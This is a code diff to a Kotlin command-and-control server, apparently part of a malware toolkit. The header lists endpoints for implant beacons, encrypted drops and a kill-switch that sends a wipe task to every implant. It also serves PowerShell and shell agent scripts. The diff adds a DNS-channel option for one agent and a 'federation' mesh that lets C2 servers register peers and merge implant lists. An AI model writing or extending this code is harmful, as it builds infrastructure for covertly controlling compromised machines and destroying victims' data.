@@ -19,7 +19,10 @@ import java.io.IOException
  *   POST /r                implant beacons (hb / posix drop / encrypted drop)
  *   POST /kill             arm/disarm kill-switch (wipe task on every implant)
  *   GET  /s/<profile>      OBSIDIAN ps1 + GHOSTFANG sh agent scripts
+ *                          (optional ?domain= for GHOSTFANG-DNS)
  *   POST /ai               QCLI_API command dispatcher
+ *   GET|POST /federation/reg   FEDERATION mesh: identity / implant-list merge
+ *   POST /federation/peer      FEDERATION mesh: peer registration
  */
 class C2Server(
     port: Int,
@@ -48,7 +51,16 @@ class C2Server(
                 handleKill(session)
 
             method == Method.GET && (uri == "/s" || uri.startsWith("/s/")) ->
-                handleAgent(uri.removePrefix("/s").removePrefix("/"))
+                handleAgent(session)
+
+            method == Method.GET && uri == "/federation/reg" ->
+                json(Federation.identity().toString())
+
+            method == Method.POST && uri == "/federation/reg" ->
+                json(Federation.register(jsonBody(session) ?: JSONObject()).toString())
+
+            method == Method.POST && uri == "/federation/peer" ->
+                json(Federation.addPeer(jsonBody(session) ?: JSONObject()).toString())
 
             method == Method.POST && uri == "/ai" ->
                 handleAi(session)
@@ -59,7 +71,14 @@ class C2Server(
                         .put("ok", true)
                         .put("version", C2State.VERSION)
                         .put("dashboard", "/dash")
-                        .put("endpoints", JSONArray(listOf("/dash", "/dash/api/state", "/r", "/kill", "/s/<profile>", "/ai")))
+                        .put(
+                            "endpoints", JSONArray(
+                                listOf(
+                                    "/dash", "/dash/api/state", "/r", "/kill",
+                                    "/s/<profile>", "/ai", "/federation/reg", "/federation/peer"
+                                )
+                            )
+                        )
                         .toString()
                 )
 
@@ -130,9 +149,12 @@ class C2Server(
     }
 
     // ------------------------------------------------------------------ /s
-    private fun handleAgent(profile: String): Response {
+    /** Optional ?domain=<zone> flavors the GHOSTFANG-DNS agent (ghostdns cmd). */
+    private fun handleAgent(session: IHTTPSession): Response {
+        val profile = (session.uri ?: "").removePrefix("/s").removePrefix("/")
+        val domain = session.parameters["domain"]?.firstOrNull()?.trim()?.takeUnless { it.isEmpty() }
         val c2 = "${Net.localIp()}:${QuantServerManager.boundPort}"
-        val agent = Agents.profile(profile, c2)
+        val agent = Agents.profile(profile, c2, domain ?: "qcli.local")
             ?: return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "unknown profile")
         val (fileName, text) = agent
         C2State.audit("C2", "agent served: /s/$profile ($fileName)")
